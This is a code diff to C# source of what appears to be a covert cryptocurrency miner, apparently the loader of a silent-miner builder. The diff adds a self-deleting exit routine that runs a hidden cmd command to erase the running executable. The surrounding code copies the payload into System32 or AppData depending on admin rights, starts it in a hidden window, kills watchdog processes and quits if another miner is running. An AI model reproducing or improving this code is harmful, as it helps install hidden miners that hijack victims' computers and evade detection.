@@ -28,12 +28,17 @@ using System.Windows.Forms;
 public partial class RProgram
 {
 #if DefSystem32
-    public static string rbD = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + RGetString("#LIBSPATH")).ToLower();
+    public static string rbD = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + RGetString("#LIBSPATH"));
 #else
-    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH")).ToLower();
+    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH"));
 #endif
 #if DefInstall
-    public static string rplp = (PayloadPath).ToLower();
+    public static string rplp = PayloadPath;
+#endif
+#if DefKillWD
+    public static string cmdl = Environment.GetCommandLineArgs()[1];
+#else
+    public static string cmdl = Assembly.GetEntryAssembly().Location;
 #endif
 
     public static void Main()
@@ -67,7 +72,7 @@ public partial class RProgram
 #endif
         }
         
-       if (Assembly.GetEntryAssembly().Location.ToLower() != rplp)
+       if (cmdl.ToLower() != rplp.ToLower())
         {
             foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
             {
@@ -85,7 +90,7 @@ public partial class RProgram
             } catch(Exception ex) {}
 
             Directory.CreateDirectory(Path.GetDirectoryName(rplp));
-            File.Copy(Assembly.GetEntryAssembly().Location.ToLower(), rplp, true);
+            File.Copy(cmdl, rplp, true);
             Thread.Sleep(2 * 1000);
             Process.Start(new ProcessStartInfo
             {
@@ -94,7 +99,7 @@ public partial class RProgram
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
             });
-            Environment.Exit(0);
+            RExit();
         }
 #endif
 
@@ -140,7 +145,7 @@ public partial class RProgram
             {
                 if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(RGetString("#MINERID")))
                 {
-                    Environment.Exit(0);
+                    RExit();
                 }
             }
 
@@ -290,6 +295,7 @@ public partial class RProgram
             MessageBox.Show("M8: " + Environment.NewLine + ex.ToString());
 #endif
         }
+        RExit();
     }
 
     public static byte[] RGetTheResource(string rarg1)
@@ -310,6 +316,20 @@ public partial class RProgram
             return rarg1;
         }
         return rarg1.Length > rarg2 ? rarg1.Substring(0, rarg2) : rarg1;
+    }
+
+    public static void RExit()
+    {
+#if DefKillWD
+        Process.Start(new ProcessStartInfo()
+        {
+            FileName = "cmd",
+            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\"",
+            WindowStyle = ProcessWindowStyle.Hidden,
+            CreateNoWindow = true
+        });
+#endif
+        Environment.Exit(0);
     }
 
 #if DefGPU
